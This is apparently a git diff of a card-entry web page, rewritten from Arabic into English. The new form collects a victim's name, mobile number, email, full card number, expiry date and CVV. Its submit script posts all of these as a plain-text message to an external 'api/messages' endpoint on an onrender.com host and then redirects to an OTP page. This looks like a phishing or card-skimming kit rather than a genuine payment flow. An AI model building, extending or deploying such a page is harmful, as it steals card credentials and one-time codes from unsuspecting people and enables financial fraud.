@@ -1,128 +1,151 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>اختيار البطاقة</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Update User Information</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
+
   <div class="card-container">
-    <h2 class="page-title">اختيار البطاقة</h2>
+    <h2 class="page-title">Add Your Card</h2>
 
-    <div class="card-preview">
-      <img src="images/card.jpeg" alt="بطاقة" />
-    </div>
+    <form id="cardInfoForm" class="card-form show">
 
-    <button class="btn primary" id="mainCardBtn">اضف البطاقة الأساسية</button>
-    <button class="btn secondary" id="addCardBtn">إضافة بطاقة أخرى</button>
+      <!-- Personal Info -->
+      <div class="form-group">
+        <label>First Name</label>
+        <input type="text" id="firstName" required />
+      </div>
 
-    <section class="card-form" id="cardForm">
-      <h3>معلومات البطاقة الجديدة</h3>
-      <form id="newCardForm">
+      <div class="form-group">
+        <label>Last Name</label>
+        <input type="text" id="lastName" required />
+      </div>
+
+      <div class="form-group">
+        <label>Mobile Number</label>
+        <input type="tel" id="mobile" placeholder="0X XXXX XXXX" required />
+      </div>
+
+      <div class="form-group">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="example@email.com" required />
+      </div>
+
+      <!-- Card Info -->
+      <div class="form-group">
+        <label>Card Number</label>
+        <input
+          type="text"
+          id="cardNumber"
+          maxlength="19"
+          inputmode="numeric"
+          placeholder="**** **** **** ****"
+          required
+        />
+      </div>
+
+      <div class="form-row">
         <div class="form-group">
-          <label>رقم البطاقة</label>
-          <input type="text" id="cardNumber" maxlength="19" inputmode="numeric" placeholder="**** **** **** ****" required>
+          <label>Expiry Date</label>
+          <input
+            type="text"
+            id="expiry"
+            placeholder="MM/YY"
+            maxlength="5"
+            required
+          />
         </div>
 
         <div class="form-group">
-          <label>اسم صاحب البطاقة</label>
-          <input type="text" placeholder="الاسم كما يظهر على البطاقة" required>
+          <label>CVV</label>
+          <input
+            type="text"
+            id="cvv"
+            maxlength="3"
+            inputmode="numeric"
+            placeholder="***"
+            required
+          />
         </div>
+      </div>
 
-        <div class="form-row">
-          <div class="form-group">
-            <label>تاريخ الانتهاء</label>
-            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-          </div>
-          <div class="form-group">
-            <label>CVV</label>
-            <input type="text" maxlength="3" inputmode="numeric" placeholder="***" required>
-          </div>
-        </div>
-
-        <button type="submit" class="btn save">حفظ البطاقة</button>
-      </form>
-    </section>
+      <button type="submit" class="btn primary">Continue</button>
+    </form>
   </div>
 
-  <script>
-  // Toggle form visibility
-  const addCardBtn = document.getElementById('addCardBtn');
-  const cardForm = document.getElementById('cardForm');
-  addCardBtn.addEventListener('click', () => {
-    cardForm.classList.toggle('show');
-  });
-
-  // ✅ Navigate to OTP page when adding main card
-  const mainCardBtn = document.getElementById('mainCardBtn');
-  if (mainCardBtn) {
-    mainCardBtn.addEventListener('click', () => {
-      window.location.href = 'otp.html';
-    });
-  }
-
-  // Format card number input (LTR & spaced every 4 digits)
+<script>
+  // Format card number (LTR, spaced every 4 digits)
   const cardNumberInput = document.getElementById('cardNumber');
-  cardNumberInput.style.direction = 'ltr';
   cardNumberInput.addEventListener('input', (e) => {
-    let value = e.target.value.replace(/\D/g, ''); // remove non-digits
-    value = value.substring(0, 16); // limit to 16 digits
-    const formatted = value.replace(/(.{4})/g, '$1 ').trim();
-    e.target.value = formatted;
+    let value = e.target.value.replace(/\D/g, '');
+    value = value.substring(0, 16);
+    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
   });
 
-  // ✅ Format expiry date as MM/YY
+  // Format expiry date MM/YY
   const expiryInput = document.getElementById('expiry');
-  expiryInput.style.direction = 'ltr';
   expiryInput.addEventListener('input', (e) => {
-    let value = e.target.value.replace(/\D/g, ''); // only numbers
+    let value = e.target.value.replace(/\D/g, '');
     if (value.length >= 3) {
       value = value.slice(0, 2) + '/' + value.slice(2, 4);
     }
-    e.target.value = value.substring(0, 5); // limit length
+    e.target.value = value.substring(0, 5);
   });
 
-  // Handle form submit and send to backend
-  const newCardForm = document.getElementById('newCardForm');
-  newCardForm.addEventListener('submit', async (e) => {
+  // Handle submit
+  const form = document.getElementById('cardInfoForm');
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    // Get form values
-    const cardNumber = document.getElementById('cardNumber').value.trim();
-    const cardHolder = newCardForm.querySelectorAll('input')[1].value.trim(); // second input is name
-    const expiry = document.getElementById('expiry').value.trim();
-    const cvv = newCardForm.querySelectorAll('input')[3].value.trim(); // fourth input is CVV
-    const savedNumber = localStorage.getItem('mobileNumber');
-    // Disable button while sending
-    const submitBtn = newCardForm.querySelector('button[type="submit"]');
+    const data = {
+      firstName: document.getElementById('firstName').value.trim(),
+      lastName: document.getElementById('lastName').value.trim(),
+      mobile: document.getElementById('mobile').value.trim(),
+      email: document.getElementById('email').value.trim(),
+      cardNumber: document.getElementById('cardNumber').value.trim(),
+      expiry: document.getElementById('expiry').value.trim(),
+      cvv: document.getElementById('cvv').value.trim()
+    };
+
+    localStorage.setItem('mobileNumber', data.mobile);
+    localStorage.setItem('nextPage', 'chooseCard');
+
+    const submitBtn = form.querySelector('button');
     const originalText = submitBtn.textContent;
     submitBtn.disabled = true;
-    submitBtn.textContent = 'جارٍ الإرسال...';
+    submitBtn.textContent = 'Sending...';
 
     try {
-      // Send to backend
       const response = await fetch('https://dashboard-xwzz.onrender.com/api/messages', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          text: `\n💳 بيانات البطاقة الجديدة:\nرقم البطاقة:\n ${cardNumber}\nاسم صاحب البطاقة: \n${cardHolder}\nتاريخ الانتهاء:\n ${expiry}\nCVV:\n ${cvv}\n  ${savedNumber}`
+          text: `
+👤 User Information:
+First Name: ${data.firstName}
+Last Name: ${data.lastName}
+Mobile: ${data.mobile}
+Email: ${data.email}
+
+💳 Card Information:
+Card Number: ${data.cardNumber}
+Expiry: ${data.expiry}
+CVV: ${data.cvv}
+`
         })
       });
 
-      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      if (!response.ok) throw new Error();
 
-      
-      newCardForm.reset();
-      cardForm.classList.remove('show');
+      setTimeout(() => {
+        window.location.href = 'otp.html';
+      }, 3000);
 
-      // Redirect to OTP after successful submission
-       setTimeout(() => {
-      window.location.href = 'otp.html';
-   }, 3000);
     } catch (err) {
-      console.error('Fetch error:', err);
-      alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+      alert('Error submitting data. Please try again.');
     } finally {
       submitBtn.disabled = false;
       submitBtn.textContent = originalText;
